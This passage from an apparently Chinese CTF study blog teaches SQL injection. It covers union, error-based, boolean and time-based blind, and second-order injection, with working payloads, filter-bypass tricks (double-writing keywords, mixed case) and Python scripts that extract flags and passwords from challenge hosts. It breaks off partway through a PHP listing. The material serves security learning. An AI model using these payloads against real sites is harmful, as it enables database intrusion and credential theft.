<td style="text-align:left"><code>&amp;&amp;</code></td>
</tr>
<tr>
<td style="text-align:left"><code>OR</code></td>
<td style="text-align:left">`\</td>
<td>\</td>
<td>`</td>
</tr>
<tr>
<td style="text-align:left"><code>=</code></td>
<td style="text-align:left"><code>LIKE</code>, <code>REGEXP</code>, <code>BETWEEN</code></td>
</tr>
<tr>
<td style="text-align:left"><code>&gt;</code></td>
<td style="text-align:left"><code>NOT BETWEEN 0 AND X</code></td>
</tr>
<tr>
<td style="text-align:left"><code>WHERE</code></td>
<td style="text-align:left"><code>HAVING</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="创建表格"><a href="#创建表格" class="headerlink" title="创建表格"></a>创建表格</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;admin&#x27;</span> username,<span class="string">&#x27;123&#x27;</span> password)a <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这部分创建了一个临时的虚拟表，其中包含两列：username 和 password，并且它们的值分别是 ‘admin’ 和 ‘123’，上面的子查询被命名为 a，这意味着整个子查询的结果会被视为一个名为 a 的表</p>
<p>这部分从虚拟表 a 中选择 username 和 password 两列，并且只选择满足条件 username=’admin’ 和 password=’123’ 的记录</p>
<p>综合来看，该 SQL 语句最终返回的结果是：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>username</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr>
<td>admin</td>
<td>123</td>
</tr>
</tbody>
</table>
</div>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="攻防世界-NewsCenter"><a href="#攻防世界-NewsCenter" class="headerlink" title="攻防世界 NewsCenter"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a> NewsCenter</h4><p><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()#</code></p>
<p>//news secret_table</p>
<p><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#39;secret_table&#39;#</code></p>
<p>//id f14g</p>
<p><code>1&#39; union select 1,2,group_concat(fl4g) from secret_table#</code></p>
<p>// QCTF{sq1_inJec7ion_ezzz}</p>
<h4 id="BUUCTF在线评测-Baby-SQL（双写绕过）"><a href="#BUUCTF在线评测-Baby-SQL（双写绕过）" class="headerlink" title="BUUCTF在线评测 Baby SQL（双写绕过）"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[极客大挑战 2019]BabySQL">BUUCTF在线评测</a> Baby SQL（双写绕过）</h4><p><strong>试列数：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,3%23</code>（这个URL编码是#）</p>
<p><strong>爆数据库：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code></p>
<p><strong>爆表：</strong><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&quot;ctf&quot; %23</code></p>
<p><strong>查字段名：</strong><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&quot;Flag&quot;%23</code></p>
<p><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>
<p>PS: <strong>(双写绕过)</strong></p>
<p>因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。</p>
<p>比如 union在程序员处理时被替换为空，那需要我们可以尝试把union改写为 un<font color="red">union</font>ion ，这样红色部分替换为空，则剩下的依然为union还可以结合大小写过滤一起使用</p>
<h4 id="BUUCTF在线评测-EZ-sql（大小写绕过）"><a href="#BUUCTF在线评测-EZ-sql（大小写绕过）" class="headerlink" title="BUUCTF在线评测 EZ_sql（大小写绕过）"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]ez_sql">BUUCTF在线评测</a> EZ_sql（大小写绕过）</h4><p>Payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fb159c83-e932-48ed-88af-dbe07ad17a5a.node5.buuoj.cn:81/?id=&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(1,100):</span></span><br><span class="line">    <span class="comment">#payload = f&quot;TMP0919&#x27; Order by &#123;i&#125;%23&quot;</span></span><br><span class="line">    <span class="comment">#res = requests.get(url=url + payload)</span></span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="comment">#if(&quot;id&quot; not in res.text):</span></span><br><span class="line">    <span class="comment">#    print(f&quot;i = &#123;i&#125;&quot;)</span></span><br><span class="line">    <span class="comment">#    break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(TaBle_nAme) From infOrmation_schema.tables WHeRe Table_schema=Database())),2,3,4,5%23&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(column_name) From infOrmation_schema.columns WHeRe Table_name=&#x27;here_is_flag&#x27;)),2,3,4,5%23&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1&#x27; uNion Select ((sElect gRoUp_cOnCat(flag) From here_is_flag)),2,3,4,5%23&quot;</span></span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/123416521">报错注入是什么？一看你就明白了。报错注入原理+步骤+实战案例-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇（updatexml extractvalue floor） - 陈子硕 - 博客园</a></p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>SQL注入分类：</p>
<ul>
<li>回显正常—-&gt; 联合查询 union select</li>
<li>回显报错—-&gt; </li>
<li><strong>Duplicate entry()</strong></li>
<li><strong>extractvalue()</strong>         </li>
<li><strong>updatexml()</strong></li>
</ul>
<p>MySQL提供了一个 <strong>updatexml()</strong> 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中，在地址栏输入：</p>
<p><code>?id=1&#39; and updatexml(1, 0x7e, 3) -- a</code></p>
<p><code>0x7e</code>  等价于 <code>~</code> </p>
<p>参数2包含特殊符号 <code>~</code>，触发数据库报错，并将参数2的内容显示在报错信息中</p>
<p>结合最开始讲的 <code>concat()</code>，我们可以将触发报错的字符和我们想要查询的语句拼接在一起：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e,version()), 3) -- a</span></span><br></pre></td></tr></table></figure>
<p>参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面</p>
<p>那么页面就会显示 ~ 和 版本号</p>
<p><strong>局限性</strong></p>
<p>updatexml() 函数的报错内容长度不能超过32个字符</p>
<p>所以我们可以采用 <strong>limit</strong> 和 <strong>substr()截取字符</strong>的方法</p>
<p><strong>limit</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select userfrom mysql.user limit 0,1)),3) -- a</span></span><br><span class="line"><span class="string">#展示第0条数据</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> userfrom mysql.user limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">3</span>) <span class="comment">-- a</span></span><br><span class="line">#展示第<span class="number">1</span>条数据</span><br></pre></td></tr></table></figure>
<p><strong>substr()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user) from mysql.user), 1 , 31)),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#从第一个字符开始截取到第31个字符</span></span><br></pre></td></tr></table></figure>
<p><strong>步骤总结</strong></p>
<p>判断是否报错<br>参数中添加单/双引号，页面报错才可进行下一步</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; -- a</span></span><br></pre></td></tr></table></figure>
<p>判断报错条件<br>参数中添加报错函数，检查报错信息是否正常回显</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,3) -- a</span></span><br></pre></td></tr></table></figure>
<p>获取所有数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,substr( (select group_concat(schema_name) from information_schema.schemata), 1 , 31)),3) -- a</span></span><br></pre></td></tr></table></figure>
<p>获取所有表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,substr( (select group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>security<span class="string">&#x27;), 1 , 31)),3) -- a</span></span><br></pre></td></tr></table></figure>
<p>获取所有字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,substr( (select group_concat(column_name) from information_schema.columns where table_schema = &#x27;</span>security<span class="string">&#x27; and table_name = &#x27;</span>users<span class="string">&#x27;), 1 , 31)),3) -- a</span></span><br></pre></td></tr></table></figure>
<p>同理：</p>
<p><strong>extractvalue()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">-</span> 此函数从目标XML中返回包含所查询值的字符串</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"><span class="operator">-</span> extractvalue（XML_document，xpath_string） </span><br><span class="line"><span class="operator">-</span> 第一个参数：string格式，为XML文档对象的名称 </span><br><span class="line"><span class="operator">-</span> 第二个参数：xpath_string（xpath格式的字符串） </span><br><span class="line"><span class="operator">-</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br><span class="line"><span class="operator">-</span> extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</span><br><span class="line"><span class="operator">-</span> <span class="keyword">select</span> <span class="keyword">user</span>,password <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="number">0x7e</span>));</span><br><span class="line"><span class="operator">-</span> 由于<span class="number">0x7e</span>就是<span class="operator">~</span>不属于xpath语法格式，因此报出xpath语法错误</span><br></pre></td></tr></table></figure>
<p><strong>floor()函数</strong></p>
<p><code>rand()</code> 可以产生0和1之间的随机数</p>
<p><code>floor()</code>返回小于等于括号内该值的最大整数</p>
<p><code>floor (rand(0)*2)</code> 可以产生两个确定的数，也就是0和1</p>
<p><code>group by</code> 分类汇总</p>
<p><code>count（*）</code> 统计结果的记录数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),floor(rand(0)*2) x from mysql(这里只是个名字) group by x;</span><br></pre></td></tr></table></figure>
<p>当count（*）和group by x同时执行时，就会爆出duplicate entry错误</p>
<p>通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因</p>
<p>是 floor(random(0)<em>2)的不确定性，即<em>*可能为 0 也可能为 1</em></em></p>
<p>group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，</p>
<p>如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果</p>
<p>该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算</p>
<p>rand 值）</p>
<p>如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临</p>
<p>时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就</p>
<p>会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值</p>
<p>实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行</p>
<p>时是不报错的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">判断是否存在报错注入</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出当前数据库名</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),database()) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x #</span><br><span class="line"></span><br><span class="line">爆出表</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27; limit 0,1)) x from information_schema.schemata group by x#</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),<span class="number">0x3a</span>,(<span class="keyword">select</span> concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x#</span><br><span class="line"></span><br><span class="line">爆出字段名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>dvwa<span class="string">&#x27; limit 0,1)) x from information_schema.schemata group by x#</span></span><br><span class="line"><span class="string">（ 改变limit限定数值，可以得出当前的字段 user_id first_name user password）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出user和password</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),<span class="number">0x3a</span>,(<span class="keyword">select</span> concat(<span class="keyword">user</span>,<span class="number">0x3a</span>,password) <span class="keyword">from</span> dvwa.users limit <span class="number">0</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x#</span><br></pre></td></tr></table></figure>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43531669/article/details/96746687">SQL注入学习——Bool盲注详解 sqli-labs(Less 8)-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1632161">MySQL手注之布尔型盲注详解-腾讯云开发者社区-腾讯云</a></p>
<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p><strong>常用函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">database()	  显示数据库名称</span><br><span class="line">left(a,b)	  从左侧截取a的前b位</span><br><span class="line">substr(a,b,c) 从b位置开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)    从位置b开始，截取a字符串的c位</span><br><span class="line">length()      返回字符串的长度</span><br><span class="line">Ascii()       将某个字符转换为ascii值</span><br><span class="line">char()        将ASCII码转换为对应的字符</span><br></pre></td></tr></table></figure>
<p>基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回<code>True</code>（页面）和<code>False</code>（页面。</p>
<p>虽然无法根据应用程序的返回页面得到我们需要的信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息</p>
<p>比如比较第一个字符的ASCII码大小是否大于b亦或者小于f这种的，就可以慢慢猜出全部的名字（就是很麻烦）</p>
<p>（所以这里推荐脚本）</p>
<p>先看看手注的步骤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and left(database(),1)&gt;&#x27;</span>a<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((database()),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span><span class="number">80</span><span class="comment">--+ (这个80是ASCII码)</span></span><br></pre></td></tr></table></figure>
<p>假如页面回显是正常的，就说明数据库的第一位是比 a 大的</p>
<p>然后查看第二位</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and left(database(),2)&gt;&#x27;</span>sa<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((database()),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">&gt;</span><span class="number">80</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>以此类推</p>
<p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure>
<h4 id="BUUCTF在线评测-Hack-World"><a href="#BUUCTF在线评测-Hack-World" class="headerlink" title="BUUCTF在线评测 Hack World"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day2 Web1]Hack World">BUUCTF在线评测</a> Hack World</h4><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p><img src="/img/lazy.gif" data-original="sql1.png" alt=""></p>
<p>时间盲注使用的优先级并不高，通常是在联合注入、报错注入、布尔盲注都无法使用时才会考虑使用：</p>
<ol>
<li>页面没有回显位置（联合注入无法使用）</li>
<li>页面不显示数据库的报错信息（报错注入无法使用）</li>
<li>无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）</li>
</ol>
<p><strong>判断是否存在时间盲注</strong></p>
<p>确定注入点以后，需要判断网页是否存在时间盲注，同时满足以下两种情况时，可以确定存在时间盲注：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1, sleep(5), 3) -- a	延时5秒响应</span><br><span class="line">?id=1&#x27; and if(0,sleep(5),3) -- a	正常响应</span><br></pre></td></tr></table></figure>
<p><strong>第二步：判断长度</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if((length(查询语句) =1), sleep(5), 3) -- a</span></span><br></pre></td></tr></table></figure>
<p>如果页面响应时间超过5秒，说明长度判断正确（sleep(5)<br>如果页面响应时间不超过5秒（正常响应），说明长度判断错误，继续递增判断长度</p>
<p>(具体时间应该看题目)</p>
<p><strong>第三步：枚举字符</strong></p>
<p>利用MySQL的 if() 和 sleep() 判断字符的内容<br>从查询结果中截取第一个字符，转换成ASCLL码，从32开始判断，递增至126</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(查询语句,1,1)) =1), sleep(5), 3) -- a</span><br></pre></td></tr></table></figure>
<p><strong>脚本</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze6irbn0iiiic2wnub2.cloudeci1.ichunqiu.com/index.html&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line"> low = <span class="number">32</span></span><br><span class="line"> high = <span class="number">128</span></span><br><span class="line"> mid = (low+high)//<span class="number">2</span></span><br><span class="line"> <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">     time.sleep(<span class="number">0.2</span>)</span><br><span class="line">     payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line"><span class="comment">#把payload里password换成username打username</span></span><br><span class="line">     datas = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: payload</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment"># print(datas)</span></span><br><span class="line">     start_time=time.time()</span><br><span class="line">     res = requests.post(url=url,data=datas)  <span class="comment">#json=data</span></span><br><span class="line">     end_time=time.time()</span><br><span class="line">     spend_time=end_time-start_time</span><br><span class="line">     <span class="keyword">if</span> spend_time&gt;=<span class="number">0.4</span>: <span class="comment">#这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。</span></span><br><span class="line">         low = mid+<span class="number">1</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         high = mid</span><br><span class="line">     mid = (low+high)//<span class="number">2</span></span><br><span class="line"> <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"> flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line"> <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>+<span class="built_in">bytes</span>.fromhex(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hhhhhhhhh85/article/details/121328475">【CTF】二次注入原理及实战-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/250490.html">SQL注入之二次注入 - FreeBuf网络安全行业门户</a></p>
<h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>用户向数据库里插入恶意的数据，但在数据被插入到数据库之前，先会对数据进行转义处理，但用户输入的数据的内容肯定是一点不变的存进数据库里，又一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能触发SQL注入</p>
<p><img src="/img/lazy.gif" data-original="sql2.png" alt=""></p>
<p>常见的函数<code>addslashes</code> 、<code>get_magic_quotes_gpc</code>、<code>mysql_escape_string</code>、<code>mysql_real_escape_string</code></p>
<h4 id="BUUCTF在线评测-CISCN-CyberPunk"><a href="#BUUCTF在线评测-CISCN-CyberPunk" class="headerlink" title="BUUCTF在线评测 CISCN CyberPunk"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019 华北赛区 Day1 Web5]CyberPunk">BUUCTF在线评测</a> CISCN CyberPunk</h4><p>（这题的二次注入不太纯粹）</p>
<p>这边主要是列举关键部分</p>
<p>首先?file=php://filter/read=convert.base64-encode/resource=change.php</p>
<p>看到关键源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#change.php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span 